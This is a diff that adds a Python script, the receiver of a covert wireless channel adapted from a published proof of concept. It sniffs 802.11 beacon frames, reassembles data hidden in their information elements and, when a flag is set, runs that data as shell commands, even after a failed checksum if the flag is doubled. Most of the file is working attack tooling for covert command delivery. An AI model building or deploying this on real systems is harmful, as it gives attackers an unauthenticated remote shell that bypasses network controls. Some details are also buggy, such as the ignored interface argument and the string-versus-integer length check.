@@ -1,0 +1,155 @@
+#!/usr/bin/python
+# -- coding: utf-8 --
+# Code based on code from: https://www.trustwave.com/Resources/SpiderLabs-Blog/Smuggler---An-interactive-802-11-wireless-shell-without-the-need-for-authentication-or-association/
+# wireless information elements receiver POC – Tom Neaves <tneaves@trustwave.com>
+# TODO: Add argparse to handle cmd line arguments (interface, debug/verbosity, execute)
+# TODO: Add option to execute
+# TODO: Add discriminatory base64 decode
+# TODO: Change ReadyToSend from ASCII characters to bit flags
+# TODO: fix ReadData function so it finishes after all data sent
+# TODO: add arg to save data as a file
+# TODO: implement md5 hash evaluation
+
+__author__ = 'Ben Smith'
+
+import logging
+import hashlib
+import base64
+import argparse
+import os
+import base64
+from scapy.all import *
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+
+
+# Reminder about 802.11 types:
+# Type 0: Management
+#   Subtype 0: Association Req
+#   Subtype 4: Probe
+#   Subtype 5: Probe Response
+#   Subtype 8: Beacon
+#   Subtype 11: Authentication
+#   Subtype 12: Deauth
+# Type 1: Control
+#   Subtype 27: Request-To-Send
+#   Subtype 28: Clear-To-Send
+# Type 2: Data
+#   Subtype 32: Data
+#   Subtype 40: QoS
+
+def main():
+    #sniff(iface="mon0", prn = packets)
+    global md5Hash
+    global sendLength
+    global WatchSsid
+    global listenBuffer
+    global debug
+    global execute
+    WatchSsid = ""
+    listenBuffer = ""
+        # set command line options
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-v", "--verbosity", dest="verbosity", help="be more verbose", action='count')
+    parser.add_argument("-e", "--execute", dest="execute", help="DANGEROUS: execute whatever we receive at bash cmd line (2 e to force even after bad checksum)", action='count')
+    parser.add_argument("-i", "--iface", dest="iface", help="monitor mode wifi interface to broadcast on")
+    parser.add_argument("-f", "--outfile", dest="outfile", help="output whatever is sent to a file")
+    parser.add_argument("-n", "--nooutput", dest="nooutput", help="do not display full sent data to screen", action='store_true')
+    parser.add_argument("-b", "--base64", dest="base64", help="base64 decode the data before any other action", action='store_true')
+    args = parser.parse_args()
+    debug = args.verbosity or 0
+    execute = args.execute
+    outfile = args.outfile
+    b64 = args.base64
+    if args.iface:
+        conf.iface = args.iface
+    else:
+        conf.iface = "mon0"
+
+    if debug: print "[DEBUG] starting first sniff"
+    sniff(iface="mon0", stop_filter = FindRTS) # stop_filter lets us end after we find an RTS packet
+    if debug: print "[DEBUG] starting second sniff"
+    sniff(iface="mon0", stop_filter = ReadData)
+    if debug: print "[DEBUG] End of data. %s bytes read" %(sendLength)
+
+    # Validate that checksum matches what we got
+    if ValidateChecksum(listenBuffer,md5Hash):
+        print "[*] Checksum validated"
+    else:
+        print "[*] WARNING: Checksum failed"
+        execute = execute - 1
+        if debug: print "[DEBUG] Checksum failed, killing chance of execution unless unsafe option passed"
+    if debug: print "[DEBUG] first part of listen buffer:"
+    if debug:
+        if len(listenBuffer) > 255: print listenBuffer[0:255]
+        else: print listenBuffer
+
+    if b64:
+        if debug: print "[DEBUG] base64 decoding data"
+        oldBuffer = listenBuffer
+        listenBuffer = base64.b64decode(listenBuffer)
+    if execute:
+        if debug: print "[DEBUG] executing: ` %s ` on system" %(listenBuffer)
+        print subprocess.Popen(listenBuffer, shell=True, stdout=subprocess.PIPE).stdout.read()
+    if outfile:
+        while os.path.isfile(outfile):
+            if debug: print "[DEBUG] file exists, appending _CovertRate"
+            outfile = outfile + "_CovertRate"
+        f = open(outfile,'w')
+        f.write(listenBuffer)
+    if not args.nooutput:
+        print listenBuffer
+
+def FindRTS(pkt):
+    global md5Hash
+    global sendLength
+    global WatchSsid
+    global listenBuffer
+    if pkt.haslayer(Dot11):
+        if pkt.type == 0 and pkt.subtype == 8: # and pkt.info == "" : # if management frame and beacon and SSID is blank
+            if pkt[Dot11Elt:2].info.startswith("RTS"):
+                #RTS Rec'd!
+                RTSSplit = pkt[Dot11Elt:2].info
+                if debug: print "[DEBUG] RTSSplit: %s" % (RTSSplit)
+                RTSSplit = RTSSplit.split(".")
+                RTSSplit = base64.b64decode(RTSSplit[1])
+                RTSSplit = RTSSplit.split(".")
+                md5Hash = RTSSplit[0]
+                sendLength = RTSSplit[1]
+
+                WatchSsid = RTSSplit[2]
+                print "[*] ReadyToSend packet received" # AP MAC: %s | SSID: %s " % (pkt.addr2, pkt.info ) # rates: (pkt[Dot11Elt:2].info)
+                print "[*]    Hidden data: md5: %s | length: %s | SSID to look for: %s" % (md5Hash, sendLength, WatchSsid)
+                return True
+
+def ReadData(pkt):
+    global md5Hash
+    global sendLength
+    global WatchSsid
+    global listenBuffer
+
+    if len(listenBuffer) == sendLength:
+        return True
+    if pkt.haslayer(Dot11):
+        #print pkt[Dot11Elt:2].info
+        #print pkt.info
+        #print WatchSsid
+        if pkt.type == 0 and pkt.subtype == 8 and pkt.info == WatchSsid:
+            if debug: print "[DEBUG] packet info: " + pkt[Dot11Elt:2].info
+            listenBuffer = listenBuffer + pkt[Dot11Elt:2].info
+            if debug > 1: print "[DEBUG] Data received: %s" % (listenBuffer)
+            if len(listenBuffer) == int(sendLength):
+                return True
+
+
+def ValidateChecksum(data, hash):
+    # validate the data is correct
+    m = hashlib.md5()
+    m.update(data)
+    if m.hexdigest() == hash:
+        return True
+    else:
+        return False
+
+if __name__ == "__main__":
+    main()
